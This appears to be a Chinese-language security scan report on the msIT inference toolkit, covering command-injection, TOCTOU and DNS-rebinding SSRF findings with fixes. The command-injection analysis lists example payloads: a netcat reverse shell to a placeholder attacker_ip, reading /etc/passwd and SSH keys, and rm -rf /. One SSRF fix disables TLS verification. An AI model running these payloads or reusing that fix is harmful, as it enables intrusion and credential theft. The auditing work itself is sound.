# 漏洞扫描报告 — 待确认漏洞

**项目**: MindStudio Inference Tools (msIT)
**扫描时间**: 2026-04-21T01:30:00Z
**报告范围**: 包含 LIKELY / POSSIBLE 状态的漏洞

---

## 执行摘要

本次安全扫描针对 MindStudio Inference Tools (msIT) 项目进行了全面的安全漏洞分析。该项目是昇腾 AI 推理开发工具链的核心组件，提供模型压缩、调试、调优等关键能力。扫描覆盖了 msit、msmodelslim、msprechecker、msserviceprofiler 四个主要模块及其 C++ 扩展组件，共发现 **6 个有效漏洞**（排除 10 个误报），其中 **2 个高风险漏洞**和 **4 个中风险漏洞**。

**关键发现**：

1. **命令注入漏洞占主导**：4 个命令注入漏洞（CWE-78）占总漏洞的 66.7%，主要集中在 `msprof_process.py` 和 `simulate.py` 等文件中，攻击者可能通过构造恶意命令行参数执行任意系统命令。

2. **过滤机制存在缺陷**：`remove_invalid_chars()` 函数仅过滤 `` `$|;&>< `` 等字符，未覆盖换行符 `\n`、反斜杠 `\`、括号 `()` 等 Shell 元字符，存在明确的绕过路径。

3. **SSRF 与路径遍历风险并存**：DNS rebinding 攻击可能导致内网验证被绕过；C++ 组件中存在 TOCTOU（检查时与使用时）竞态条件风险。

**业务影响**：

作为 CLI 工具套件，msIT 通常在开发环境或服务器上执行。如果攻击者能够控制命令行参数或配置文件，可能导致：
- 任意命令执行，接管服务器权限
- 敏感数据泄露（模型文件、配置信息）
- 系统服务被恶意篡改（通过 Kubernetes 配置）

**建议优先处理方向**：

- **立即修复**：`msprof_process.py` 中的命令注入漏洞（置信度 65，高风险），改用 `subprocess.run(shell=False)` 或 `shlex.quote()` 进行安全转义
- **短期修复**：完善 `remove_invalid_chars()` 函数的过滤逻辑，覆盖所有 Shell 元字符；审查 `simulate.py` 中配置文件路径的来源验证
- **计划修复**：增强 SSRF 防护，使用 IP 直连或 DNS 缓存锁定机制；C++ 组件添加原子性文件操作保护

---

## 1. 扫描摘要

### 1.1 验证状态分布

| 状态 | 数量 | 占比 |
|------|------|------|
| FALSE_POSITIVE | 10 | 62.5% |
| POSSIBLE | 4 | 25.0% |
| LIKELY | 2 | 12.5% |
| **总计** | **16** | 100% |

### 1.2 严重性分布

| 严重性 | 数量 | 占比 |
|--------|------|------|
| High | 2 | 33.3% |
| Medium | 4 | 66.7% |
| **有效漏洞总计** | **6** | - |
| 误报 (FALSE_POSITIVE) | 10 | - |

### 1.3 Top 10 关键漏洞

1. **[DF-001]** Command Injection (High) - `msit/components/profile/msit_prof/msprof/msprof_process.py:36` @ `msprof_run_profiling` | 置信度: 65
2. **[VULN-SEC-001]** command_injection (High) - `msit/components/profile/msit_prof/msprof/msprof_process.py:36` @ `msprof_run_profiling` | 置信度: 65
3. **[DF-005]** Path Traversal (Medium) - `msmodelslim/msmodelslim/pytorch/weight_compression/compress_graph/src/main.cpp:210` @ `main` | 置信度: 50
4. **[DF-008]** Command Injection (Medium) - `msit/components/debug/compare/msquickcmp/cmp_process.py:491` @ `fusion_close_model_convert` | 置信度: 50
5. **[DF-004]** Command Injection (Medium) - `msserviceprofiler/msserviceprofiler/modelevalstate/optimizer/plugins/simulate.py:420` @ `prepare_before_start_server` | 置信度: 45
6. **[VULN-SEC-006]** ssrf_partial (Medium) - `msmodelslim/msmodelslim/utils/security/request.py:12` @ `validate_safe_host` | 置信度: 45

---

## 2. 攻击面分析

| 入口点 | 类型 | 信任等级 | 可达性理由 | 说明 |
|--------|------|----------|-----------|------|
| `main@msit/components/__main__.py` | cmdline | untrusted_local | CLI 入口点，通过 argparse 解析命令行参数，用户可以控制 --model_path、--output_path 等参数，这些参数直接影响文件读写操作 | msit 工具的主入口点，处理 debug、benchmark、analyze、convert 等子命令 |
| `main@msmodelslim/msmodelslim/cli/__main__.py` | cmdline | untrusted_local | CLI 入口点，用户通过 --model_path 和 --save_path 参数指定模型文件路径，直接影响模型加载和输出操作 | msmodelslim 工具的主入口点，处理 quant、analyze、tune 等子命令 |
| `main@msprechecker/msprechecker/cli.py` | cmdline | untrusted_local | CLI 入口点，用户可以控制预检参数和配置文件路径 | msprechecker 工具的主入口点，处理 precheck、dump、compare 等子命令 |
| `main@msserviceprofiler/msserviceprofiler/__main__.py` | cmdline | untrusted_local | CLI 入口点，用户可以控制分析参数和配置路径 | msserviceprofiler 工具的主入口点，处理 compare、split、analyze 等子命令 |
| `_run_cmd@msmodelslim/msmodelslim/utils/security/shell.py` | rpc | semi_trusted | 执行外部命令的内部函数，虽然参数经过验证，但如果验证存在缺陷可能导致命令注入 | ShellRunner 内部方法，执行 subprocess.run 命令 |
| `safe_get@msmodelslim/msmodelslim/utils/security/request.py` | network | semi_trusted | HTTP GET 请求函数，虽然限制了只能访问 localhost 或内网地址，但如果验证逻辑存在绕过可能导致 SSRF | 安全的 HTTP GET 请求函数 |
| `check_network@msprechecker/msprechecker/utils/network.py` | network | semi_trusted | 网络检查功能，可能涉及 socket 连接测试 | 网络连通性检查函数 |
| `main@msmodelslim/msmodelslim/pytorch/weight_compression/compress_graph/src/main.cpp` | cmdline | untrusted_local | C++ CLI 入口点，argv 参数直接用于文件路径，需要进行路径验证 | C++ 压缩图工具的主入口点 |

**其他攻击面**:
- 命令行参数: --model_path, --save_path, --output_path 等文件路径参数
- 配置文件: 用户提供的 JSON/YAML 配置文件
- 模型文件: 用户加载的模型文件（可能包含恶意代码）
- 外部命令执行: 通过 subprocess 调用 atc, msprof 等工具
- HTTP 请求: 向 vllm/MindIE 服务发送请求进行性能测试
- Pickle 反序列化: 加载校准数据或模型权重时可能涉及 pickle
- 网络检查: socket 连接测试功能

---

## 3. High 漏洞 (2)

### [DF-001] Command Injection - msprof_run_profiling

**严重性**: High | **CWE**: CWE-78 | **置信度**: 65/100 | **状态**: LIKELY | **来源**: dataflow-scanner

**位置**: `msit/components/profile/msit_prof/msprof/msprof_process.py:36-60` @ `msprof_run_profiling`
**模块**: msit

**描述**: Command injection vulnerability in msprof_process.py. The function msprof_run_profiling uses os.system(msprof_cmd) where msprof_cmd is constructed from user-controlled arguments (args.output, args.application). The remove_invalid_chars function only removes limited characters [`$|;&><]+ which is insufficient to prevent command injection. Attackers can use newline characters (\n), carriage returns, or other techniques to bypass this filter and execute arbitrary commands.

**漏洞代码** (`msit/components/profile/msit_prof/msprof/msprof_process.py:36-60`)

```python
# 文件: msit/components/profile/msit_prof/msprof/msprof_process.py
# 行号: 36-60

def msprof_run_profiling(args, msprof_bin):
    bin_path = ' '.join(sys.argv).split(" ")[0]
    bin_path = bin_path.rsplit('/', 1)[0]
    msprof_cmd = (
        "{} --output={}/profiler --application=\"{} {}/{}\" --model-execution={}"
        " --sys-hardware-mem={} --sys-cpu-profiling={}"
        " --sys-profiling={} --sys-pid-profiling={} --dvpp-profiling={} "
        "--runtime-api={} --task-time={} --aicpu={}".format(
            msprof_bin,
            args.output,          # 用户控制的 CLI 参数
            sys.executable,
            bin_path,
            args.application,     # 用户控制的 CLI 参数
            args.model_execution,
            args.sys_hardware_mem,
            args.sys_cpu_profiling,
            args.sys_profiling,
            args.sys_pid_profiling,
            args.dvpp_profiling,
            args.runtime_api,
            args.task_time,
            args.aicpu,
        )
    )
    #非法字符过滤 - 仅有部分过滤
    msprof_cmd = remove_invalid_chars(msprof_cmd)
    logger.info("msprof cmd:{} begin run".format(msprof_cmd))
    ret = os.system(msprof_cmd)  # 危险：通过 shell 执行拼接的命令
```

**达成路径**

args.output(user_input) → msprof_cmd(string_concat) → remove_invalid_chars(insufficient_sanitization) → os.system(DANGEROUS_SINK)

**深度分析**

**根因分析**：
漏洞的核心问题在于使用 `os.system()` 执行经过字符串拼接的命令，且过滤机制 `remove_invalid_chars()` 仅移除 `` `$|;&>< `` 五种字符，覆盖范围严重不足。

**过滤机制缺陷** (`msprof_process.py:27-30`)：

```python
def remove_invalid_chars(msprof_cmd):
    invalid_chars = r'[`$|;&><]+'
    clean_msprof_cmd = re.sub(invalid_chars, '', msprof_cmd)
    return clean_msprof_cmd
```

**未过滤的 Shell 元字符**：
| 元字符 | 作用 | 绕过示例 |
|--------|------|----------|
| `\n` (换行符) | 命令分隔 | `--output=/path\nrm -rf /` |
| `\r` (回车符) | 命令分隔 | 类似换行符 |
| `\` (反斜杠) | 转义字符 | 绕过引号保护 |
| `()` | 子 shell | `--output=$(cat /etc/passwd)` |
| `{}` | 命令替换 | `--output={cat,/etc/passwd}` |
| 空字符注入 | 参数截断 | 可能影响参数解析 |

**潜在利用场景**：
1. **数据窃取**：通过 `--application` 参数注入 `;cat /etc/passwd` 或 `\ncat ~/.ssh/id_rsa`
2. **权限提升**：如果工具以高权限运行，攻击者可执行 `;chmod 777 /etc/shadow`
3. **反弹 Shell**：注入 `\nnc -e /bin/bash attacker_ip 4444` 建立远程连接
4. **持久化攻击**：写入恶意脚本到启动目录

**缓解措施评估**：
- `PATH_MAX_LENGTH = 255` 提供长度限制，但可通过短路径绕过
- `args_rules()` 函数对参数进行基本校验，但不验证内容安全性
- 其他参数（如 `model_execution`）限制为 `on/off`，降低了部分风险

**建议修复方式**：
1. **首选方案**：改用 `subprocess.run(shell=False)` 传递命令列表，彻底避免 shell 解析
2. **备选方案**：使用 `shlex.quote()` 对每个参数进行 shell 转义
3. **增强过滤**：扩展 `remove_invalid_chars()` 覆盖所有 Shell 元字符

---

### [VULN-SEC-001] command_injection - msprof_run_profiling

**严重性**: High | **CWE**: CWE-78 | **置信度**: 65/100 | **状态**: LIKELY | **来源**: security-auditor

**位置**: `msit/components/profile/msit_prof/msprof/msprof_process.py:36-60` @ `msprof_run_profiling`
**模块**: msit

**描述**: 命令注入漏洞：在 msprof_process.py 中使用 os.system() 执行命令，且输入参数来自用户可控的 CLI 参数。虽然有 remove_invalid_chars() 函数尝试过滤危险字符，但过滤不完整，未处理换行符、括号等 shell 元字符，攻击者可能通过构造特殊输入绕过过滤执行任意命令。

**漏洞代码** (`msit/components/profile/msit_prof/msprof/msprof_process.py:36-60`)

```python
msprof_cmd = (
    "{} --output={}/profiler --application=\"{} {}/{}\" ...\"\n
.format(msprof_bin, args.output, ...)\nmsprof_cmd = remove_invalid_chars(msprof_cmd)\nret = os.system(msprof_cmd)
```

**达成路径**

CLI args (--output, --application等) → msprof_cmd 字符串拼接 → remove_invalid_chars() 部分过滤 → os.system() 执行 [SINK]

**深度分析**

**与 DF-001 的关系**：此漏洞与 DF-001 为同一代码位置的重复报告，由不同的扫描引擎（Security Auditor）发现。核心问题完全一致，修复建议相同。

**补充验证点**：
- Security Auditor 验证了命令字符串拼接过程
- 确认 `args.application` 和 `args.output` 直接来自 `argparse` 解析的命令行参数
- 两个漏洞报告的置信度均为 65，验证结果高度一致

**评分明细**: base: 30 | reachability: 30 | controllability: 25 | mitigations: -20 | context: 0 | cross_file: 0

---

## 4. Medium 漏洞 (4)

### [DF-005] Path Traversal - main

**严重性**: Medium | **CWE**: CWE-22 | **置信度**: 50/100 | **状态**: POSSIBLE | **来源**: dataflow-scanner

**位置**: `msmodelslim/msmodelslim/pytorch/weight_compression/compress_graph/src/main.cpp:210-228` @ `main`
**模块**: msmodelslim_cpp

**描述**: C++ main function in main.cpp takes file paths directly from argv (command line arguments) without initial validation. While the WriteDataToFile function calls File::CheckFileBeforeCreateOrWrite for security validation, the initial path handling at the main entry point could allow manipulation before the security checks are applied. The paths include inputWeightPath, outputWeightPath, indexPath, and compressInfoPath.

**漏洞代码** (`msmodelslim/msmodelslim/pytorch/weight_compression/compress_graph/src/main.cpp:210-228`)

```cpp
// 文件: msmodelslim/msmodelslim/pytorch/weight_compression/compress_graph/src/main.cpp
// 行号: 210-228

int main(int argc, char *argv[])
{
    if (!CheckInputsStollValid(argc, argv)) {
        return GraphUtils::FAILED;
    }

    const int64_t dimK = std::stoll(argv[1]);
    const int64_t dimN = std::stoll(argv[2]);
    const int64_t isTight = std::stoll(argv[3]);
    const int64_t k_value = std::stoll(argv[4]);
    const int64_t n_value = std::stoll(argv[5]);
    const int64_t compressType = std::stoll(argv[6]);
    const int64_t isTiling = std::stoll(argv[7]);
    const string inputWeightPath = argv[8];    // 用户输入路径
    const string outputWeightPath = argv[9];   // 用户输入路径
    const string indexPath = argv[10];         // 用户输入路径
    const string compressInfoPath = argv[11];  // 用户输入路径

    vector<string> paths = {outputWeightPath, indexPath, compressInfoPath};
    // ... 后续使用 WriteDataToFile 写入文件
}
```

**达成路径**

argv[8-11](command_line) → paths(vector) → WriteDataToFile → File::CheckFileBeforeCreateOrWrite(VALIDATION)

**深度分析**

**根因分析**：
C++ 程序从 `argv` 直接获取文件路径，未在入口点进行验证。虽然后续有 `CheckFileBeforeCreateOrWrite()` 函数进行安全检查，但存在 **TOCTOU（Time-of-Check to Time-of-Use）竞态条件**风险。

**安全检查机制分析** (`File.cpp:256-298`)：

```cpp
bool File::CheckFileBeforeCreateOrWrite(const std::string &path, bool overwrite)
{
    std::string absPath = GetAbsPath(path);
    // 1. 路径长度检查
    if (!IsPathLengthLegal(absPath)) { return false; }
    // 2. 路径字符检查
    if (!IsPathCharactersValid(absPath)) { return false; }
    // 3. 路径深度检查
    if (!IsPathDepthValid(absPath)) { return false; }
    // 4. 文件存在性检查
    if (IsPathExist(absPath)) {
        // 5. 软链接检查
        if (IsSoftLink(absPath)) { return false; }
        // 6. 权限检查 (不允许超过 0o750)
        if ((GetFilePermissions(absPath) & WRITE_FILE_NOT_PERMITTED) > 0) { return false; }
        // 7. 所有者检查
        if (!IsFileWritable(absPath) || !CheckOwner(absPath)) { return false; }
    }
    return CheckDir(GetParentDir(absPath));
}
```

**TOCTOU 风险详解**：
检查与使用之间存在时间窗口，攻击者可利用：
1. **符号链接替换**：在检查后替换为指向敏感文件的软链接
2. **路径穿越**：使用 `../` 绕过路径深度限制（如果字符检查不严格）
3. **权限窗口攻击**：在检查与写入之间修改文件权限

**潜在利用场景**：
1. **敏感文件覆盖**：通过竞态条件覆盖 `/etc/passwd` 或系统配置文件
2. **权限提升**：写入具有高权限执行能力的脚本文件
3. **数据污染**：篡改模型权重文件导致推理结果异常

**建议修复方式**：
1. **入口点预验证**：在 `main()` 函数入口立即验证路径，缩小竞态窗口
2. **原子操作**：使用 `O_EXCL` 标志创建文件，防止文件已存在时被覆盖
3. **路径规范化**：在入口点使用 `realpath()` 解析绝对路径，防止路径遍历

---

### [DF-008] Command Injection - fusion_close_model_convert

**严重性**: Medium | **CWE**: CWE-78 | **置信度**: 50/100 | **状态**: POSSIBLE | **来源**: dataflow-scanner

**位置**: `msit/components/debug/compare/msquickcmp/cmp_process.py:491-501` @ `fusion_close_model_convert`
**模块**: msit

**描述**: Command injection vulnerability in cmp_process.py via utils.execute_command. The atc_cmd is constructed with user-provided arguments including args.model_path, args.offline_model_path, args.out_path. While there's a filter_cmd function called before execution, the command elements may still contain tainted values that could be exploited.

**漏洞代码** (`msit/components/debug/compare/msquickcmp/cmp_process.py:491-501`)

```python
# 文件: msit/components/debug/compare/msquickcmp/cmp_process.py
# 行号: 480-501

def fusion_close_model_convert(args: CmpArgsAdapter):
    if args.fusion_switch_file:
        args.fusion_switch_file = os.path.realpath(args.fusion_switch_file)
        utils.check_file_or_directory_path(args.fusion_switch_file)

        om_json_path = atc_utils.convert_model_to_json(args.cann_path, args.offline_model_path, args.out_path)
        om_parser = OmParser(om_json_path)
        atc_input_shape_in_offline_model = DynamicInput.get_input_shape_from_om(om_parser)

        close_fusion_om_file = os.path.join(args.out_path, 'close_fusion_om_model')
        atc_command_file_path = atc_utils.get_atc_path(args.cann_path)
        atc_cmd = [
            atc_command_file_path, "--framework=5",
            "--soc_version=" + acl.get_soc_name(),
            "--model=" + args.model_path,          # 用户输入路径
            "--output=" + close_fusion_om_file,
            "--fusion_switch_file=" + args.fusion_switch_file
        ]
        if atc_input_shape_in_offline_model:
            atc_cmd.append("--input_shape=" + atc_input_shape_in_offline_model)

        utils.execute_command(atc_cmd)  # 执行命令
```

**达成路径**

args.model_path(cli_args) → atc_cmd(list) → filter_cmd(validation) → utils.execute_command(SINK)

**深度分析**

**根因分析**：
`fusion_close_model_convert()` 函数构建 `atc_cmd` 命令列表并执行。命令参数来自 CLI 输入，但存在多层防护机制，实际风险较低。

**防护机制分析**：

1. **路径验证** (`cmp_process.py:510-518`)：
```python
def check_and_run(args: CmpArgsAdapter, use_cli: bool):
    utils.check_file_or_directory_path(args.model_path, is_saved_model_valid(args.model_path))
    utils.check_file_or_directory_path(args.offline_model_path, is_saved_model_valid(args.offline_model_path))
    # ... 多重路径验证
```

2. **命令过滤** (`util.py:158-176`)：
```python
def is_valid_command(arg_str, index):
    first_whitelist_pattern = re.compile(r"^[a-zA-Z0-9_\-./=:,\[\] ]+$")
    whitelist_pattern = re.compile(r"^[a-zA-Z0-9_\-./=:,\[\] ;]+$")
    # 白名单字符过滤

def filter_cmd(paras):
    filtered = []
    for index, arg in enumerate(paras):
        arg_str = str(arg)
        valid, pattern = is_valid_command(arg_str, index)
        if not valid:
            raise ValueError(f"The command contains invalid characters...")
```

3. **安全执行** (`utils.py:619-645`)：
```python
def execute_command(cmd, info_need=True):
    cmd = filter_cmd(cmd)  # 先过滤
    process = subprocess.Popen(cmd, shell=False, ...)  # shell=False 安全执行
```

**风险评估**：
- **缓解措施强**：`shell=False` + `filter_cmd` 白名单过滤 + 路径验证构成三层防护
- **剩余风险**：白名单允许 `;` 分号（index > 0 时），但 `shell=False` 下分号作为普通字符传递，不会触发命令分隔
- **路径遍历风险**：如果 `args.model_path` 包含 `../`，白名单允许（属于路径字符），可能导致访问非预期文件

**建议修复方式**：
1. **白名单优化**：移除 `;` 字符的允许（虽然 shell=False 下无效，但减少混淆）
2. **路径规范化**：对所有路径参数使用 `os.path.realpath()` 解析后再构建命令
3. **保持现状**：当前防护机制已足够，建议作为低优先级优化

---

### [DF-004] Command Injection - prepare_before_start_server

**严重性**: Medium | **CWE**: CWE-78 | **置信度**: 45/100 | **状态**: POSSIBLE | **来源**: dataflow-scanner

**位置**: `msserviceprofiler/msserviceprofiler/modelevalstate/optimizer/plugins/simulate.py:420-426` @ `prepare_before_start_server`
**模块**: msserviceprofiler

**描述**: Potential command injection in simulate.py. The subprocess.run is called with self.command derived from KubectlCommand configuration. The command is used to manage Kubernetes deployments and could be manipulated if an attacker controls the configuration. Additionally, subprocess.run is called with bash_path and self.config.delete_path which comes from configuration.

**漏洞代码** (`msserviceprofiler/msserviceprofiler/modelevalstate/optimizer/plugins/simulate.py:418-426`)

```python
# 文件: msserviceprofiler/msserviceprofiler/modelevalstate/optimizer/plugins/simulate.py
# 行号: 418-433

def prepare_before_start_server(self):
    bash_path = shutil.which("bash")
    if bash_path is not None:
        subprocess.run([bash_path, self.config.delete_path, "mindie", "."],
                       cwd=self.config.kubectl_default_path)
        while True:
            signal = True
            proc = subprocess.run(self.log_command, stdout=subprocess.PIPE, text=True,
                                  cwd=self.config.kubectl_default_path)
            # ... 循环检查日志
```

**达成路径**

config.delete_path(config_file) → subprocess.run(list_with_bash)

**深度分析**

**根因分析**：
配置参数 `delete_path` 和 `kubectl_default_path` 来自 `KubectlConfig` 类定义，最终值可能由配置文件或用户输入决定。如果攻击者能控制配置来源，可指定恶意脚本路径。

**配置来源分析** (`config.py:374-389`)：

```python
class KubectlConfig(BaseModel):
    process_name: str = ""
    kubectl_default_path: Path = Path("")  # 用户提供的路径
    kubectl_single_path: Optional[Path] = Field(
        default_factory=lambda data: data["kubectl_default_path"].joinpath("deploy.sh").resolve())
    delete_path: Optional[Path] = Field(
        default_factory=lambda data: data["kubectl_default_path"].joinpath("delete.sh").resolve())
    # ...
```

**默认值逻辑**：
- `delete_path` 默认为 `kubectl_default_path/delete.sh`
- 如果用户提供 `kubectl_default_path`，则 `delete_path` 自动推导

**潜在利用场景**：
1. **恶意脚本植入**：攻击者在配置中指定 `kubectl_default_path` 为包含恶意 `delete.sh` 的目录
2. **路径劫持**：替换合法的 `delete.sh` 为恶意脚本
3. **配置文件篡改**：如果配置文件来源不安全（如用户上传），可注入任意路径

**缓解措施评估**：
- 使用 `subprocess.run(shell=False)` 执行列表形式的命令，本身安全
- 但第一个元素是 `bash_path`（bash 解释器），第二个元素是脚本路径
- 这意味着会执行：`bash /path/to/script.sh mindie .`
- 如果 `script.sh` 内容恶意，仍可执行任意操作

**建议修复方式**：
1. **路径白名单**：限制 `kubectl_default_path` 和 `delete_path` 只能使用预定义的合法路径
2. **脚本验证**：执行前验证脚本文件的数字签名或哈希值
3. **配置来源审查**：确保配置文件只能由可信用户或系统管理工具修改
4. **审计日志**：记录所有外部命令执行，便于事后追溯

---

### [VULN-SEC-006] ssrf_partial - validate_safe_host

**严重性**: Medium | **CWE**: CWE-918 | **置信度**: 45/100 | **状态**: POSSIBLE | **来源**: security-auditor

**位置**: `msmodelslim/msmodelslim/utils/security/request.py:12-58` @ `validate_safe_host`
**模块**: msmodelslim

**描述**: SSRF 部分缓解但仍有风险：request.py 中的 validate_safe_host() 函数限制了只能访问 localhost 或内网地址，但使用 socket.gethostbyname() 解析主机名。DNS rebinding 攻击可能导致：第一次解析返回内网地址通过验证，但实际 HTTP 请求时 DNS 解析可能返回外部地址。

**漏洞代码** (`msmodelslim/msmodelslim/utils/security/request.py:12-58`)

```python
# 文件: msmodelslim/msmodelslim/utils/security/request.py
# 行号: 12-58

def validate_safe_host(host: str, field_name: str = "host") -> str:
    """
    验证主机地址，防止 SSRF 攻击。
    只允许 localhost、127.0.0.1 或内网 IP 地址（RFC 1918）。
    """
    if not host:
        raise SecurityError(f"{field_name} cannot be empty.")
    
    # 允许 localhost 及其变体
    if host.lower() in ('localhost', '127.0.0.1', '::1', '[::1]'):
        return host.lower()
    
    # 验证是否为有效的 IP 地址格式
    try:
        ip = socket.gethostbyname(host)  # DNS 解析
        # 检查是否为内网地址（RFC 1918）
        parts = ip.split('.')
        if len(parts) == 4:
            first_octet = int(parts[0])
            second_octet = int(parts[1])
            if (first_octet == 10 or
                (first_octet == 172 and 16 <= second_octet <= 31) or
                (first_octet == 192 and second_octet == 168)):
                return host
    except (ValueError, OSError):
        pass
    
    # 如果验证失败，抛出安全错误
    raise SecurityError(
        f"{field_name} '{host}' is not allowed. Only localhost or private network addresses are permitted."
    )
```

**达成路径**

host 参数 → socket.gethostbyname() 解析 IP → 检查 IP 是否为内网地址 → safe_get() 发起 HTTP 请求 [SINK]

**深度分析**

**根因分析**：
`validate_safe_host()` 使用 `socket.gethostbyname()` 进行 DNS 解析后检查 IP 地址范围。这存在经典的 **DNS Rebinding 攻击**漏洞。

**DNS Rebinding 攻击流程**：

```
时间线:
T0: 验证阶段 - DNS 解析返回 192.168.1.100 (内网地址)
    → validate_safe_host() 验证通过 ✓
T1: HTTP 请求阶段 - DNS 再次解析返回 203.0.113.50 (外部地址)
    → requests.get() 连接到外部地址 → SSRF 成功
```

**攻击者控制手段**：
1. **自建 DNS 服务器**：配置 TTL=0，每次解析返回不同 IP
2. **DNS 缓存绕过**：利用 DNS 服务器的配置漏洞
3. **双解析攻击**：第一次返回内网，第二次返回外网

**内网验证逻辑**：
```python
# RFC 1918 内网地址范围
# 10.0.0.0/8     → first_octet == 10
# 172.16.0.0/12  → first_octet == 172 and 16 <= second_octet <= 31
# 192.168.0.0/16 → first_octet == 192 and second_octet == 168
```

**实际 HTTP 请求执行** (`request.py:186-214`)：

```python
def safe_get(url: str, timeout: int = 30, ...):
    parsed = urlparse(url)
    if parsed.hostname:
        validate_safe_host(parsed.hostname, ...)  # 验证在请求前
    return requests.get(url, ...)  # 请求时 DNS 可能重新解析
```

**潜在利用场景**：
1. **内网服务探测**：通过 SSRF 访问内网服务（如 Redis、数据库管理界面）
2. **云服务攻击**：访问 AWS/GCP 的内部 API（如 `http://169.254.169.254/latest/meta-data`）
3. **数据泄露**：读取内网 Web 应用的敏感响应
4. **端口扫描**：通过响应时间或错误信息推断内网服务状态

**建议修复方式**：
1. **IP 直连**：验证后将解析的 IP 地址直接用于请求，避免二次解析
   ```python
   # 改进方案
   ip = socket.gethostbyname(host)
   # 验证 IP...
   # 使用 IP 构建请求 URL，避免主机名二次解析
   url = f"http://{ip}:{port}/path"
   ```
2. **DNS 缓存锁定**：在验证阶段锁定 DNS 结果，HTTP 请求使用缓存的 IP
3. **IP 白名单**：只允许预定义的 IP 地址，拒绝动态解析
4. **禁用外部请求**：如果业务仅需内网访问，完全禁止非内网地址

---

## 5. 模块漏洞分布

| 模块 | Critical | High | Medium | Low | 合计 |
|------|----------|------|--------|-----|------|
| msit | 0 | 2 | 1 | 0 | 3 |
| msmodelslim | 0 | 0 | 1 | 0 | 1 |
| msmodelslim_cpp | 0 | 0 | 1 | 0 | 1 |
| msserviceprofiler | 0 | 0 | 1 | 0 | 1 |
| **合计** | **0** | **2** | **4** | **0** | **6** |

## 6. CWE 分布

| CWE | 数量 | 占比 |
|-----|------|------|
| CWE-78 | 4 | 66.7% |
| CWE-918 | 1 | 16.7% |
| CWE-22 | 1 | 16.7% |

---

## 7. 修复建议

### 优先级 1: 立即修复 (High 级漏洞)

#### [DF-001/VULN-SEC-001] msprof_process.py 命令注入

**修复方案 A (推荐)**：改用 `subprocess.run(shell=False)`

```python
# 当前危险代码
ret = os.system(msprof_cmd)

# 修复后安全代码
import subprocess

def msprof_run_profiling(args, msprof_bin):
    # 构建命令列表而非字符串
    cmd_list = [
        msprof_bin,
        f"--output={args.output}/profiler",
        f"--application={sys.executable} {bin_path}/{args.application}",
        # ... 其他参数
    ]
    # 验证每个参数的安全性
    for arg in cmd_list:
        # 可使用现有的 validate_safe_identifier 或自定义验证
        pass
    
    result = subprocess.run(cmd_list, shell=False, capture_output=True)
    if result.returncode != 0:
        raise RuntimeError(f"msprof cmd failed, ret = {result.returncode}")
```

**修复方案 B**：使用 `shlex.quote()` 转义

```python
import shlex

def msprof_run_profiling(args, msprof_bin):
    # 对用户输入进行 shell 转义
    safe_output = shlex.quote(args.output)
    safe_application = shlex.quote(args.application)
    
    msprof_cmd = (
        "{} --output={}/profiler --application=\"{} {}/{}\" ...".format(
            msprof_bin,
            safe_output,
            sys.executable,
            bin_path,
            safe_application,
            # ...
        )
    )
    ret = os.system(msprof_cmd)
```

**修复方案 C**：增强 `remove_invalid_chars()` 过滤

```python
def remove_invalid_chars(msprof_cmd):
    # 扩展过滤字符集，覆盖所有 Shell 元字符
    # 注意：此方案不如方案 A/B 安全，仅作为临时缓解
    invalid_chars = r'[`$|;&><\n\r\\(){}]+'
    clean_msprof_cmd = re.sub(invalid_chars, '', msprof_cmd)
    return clean_msprof_cmd
```

---

### 优先级 2: 短期修复 (Medium 级漏洞)

#### [DF-008] cmp_process.py 命令参数验证

**当前状态**：已有 `filter_cmd()` 白名单过滤 + `shell=False` 执行，风险较低

**建议优化**：
- 对路径参数提前使用 `os.path.realpath()` 规范化
- 白名单中移除 `;` 字符（虽在 shell=False 下无效，但减少语义混淆）
- 增加路径所属目录的白名单验证

#### [DF-004] simulate.py 配置路径验证

**修复方案**：

```python
# 配置加载时验证路径
ALLOWED_KUBECTL_PATHS = [
    "/opt/mindie/",
    "/usr/local/mindie/",
    # 其他预定义路径
]

def validate_config_path(path: Path) -> Path:
    resolved = path.resolve()
    for allowed in ALLOWED_KUBECTL_PATHS:
        if str(resolved).startswith(allowed):
            return resolved
    raise SecurityError(f"Invalid kubectl path: {path}")

# KubectlConfig 中添加验证器
class KubectlConfig(BaseModel):
    kubectl_default_path: Path = Field(...)
    
    @validator('kubectl_default_path')
    def validate_path(cls, v):
        return validate_config_path(v)
```

---

### 优先级 3: 计划修复 (Medium 级漏洞)

#### [DF-005] main.cpp TOCTOU 风险

**修复方案**：

```cpp
// 在 main() 入口立即验证并规范化路径
int main(int argc, char *argv[])
{
    // ... 参数解析
    
    // 立即验证和规范化路径
    char resolved_path[PATH_MAX];
    
    if (realpath(argv[8], resolved_path) == nullptr) {
        ERROR_LOG("Invalid inputWeightPath");
        return GraphUtils::FAILED;
    }
    const string inputWeightPath = resolved_path;
    
    // 对其他路径同样处理...
    
    // 使用 O_EXCL 标志创建文件（原子性）
    int fd = open(outputWeightPath.c_str(), O_WRONLY | O_CREAT | O_EXCL, 0600);
    if (fd < 0) {
        ERROR_LOG("Failed to create output file");
        return GraphUtils::FAILED;
    }
    // ... 写入操作
    close(fd);
}
```

#### [VULN-SEC-006] SSRF DNS Rebinding

**修复方案**：使用 IP 直连

```python
import socket
from urllib.parse import urlparse

def safe_get_with_ip_lock(url: str, timeout: int = 30, **kwargs):
    parsed = urlparse(url)
    
    if parsed.hostname:
        # 一次性解析并锁定 IP
        try:
            ip = socket.gethostbyname(parsed.hostname)
        except OSError:
            raise SecurityError(f"Cannot resolve hostname: {parsed.hostname}")
        
        # 验证 IP 范围
        validate_safe_ip(ip)  # 验证 IP 而非 hostname
        
        # 使用解析后的 IP 直接构建请求 URL
        # 避免二次 DNS 解析
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        ip_url = f"{parsed.scheme}://{ip}:{port}{parsed.path}"
        if parsed.query:
            ip_url += f"?{parsed.query}"
        
        # 设置 Host 头以保持原始主机名
        headers = kwargs.pop('headers', {})
        headers['Host'] = parsed.hostname
        kwargs['headers'] = headers
        
        return requests.get(ip_url, timeout=timeout, verify=False, **kwargs)

def validate_safe_ip(ip: str) -> str:
    """直接验证 IP 地址，不依赖 DNS"""
    parts = ip.split('.')
    if len(parts) != 4:
        raise SecurityError(f"Invalid IP format: {ip}")
    
    first = int(parts[0])
    second = int(parts[1])
    
    # 内网地址检查
    if first == 10 or \
       (first == 172 and 16 <= second <= 31) or \
       (first == 192 and second == 168) or \
       first == 127:  # localhost
        return ip
    
    raise SecurityError(f"IP {ip} is not in allowed private network ranges")
```

---

### 修复优先级总结

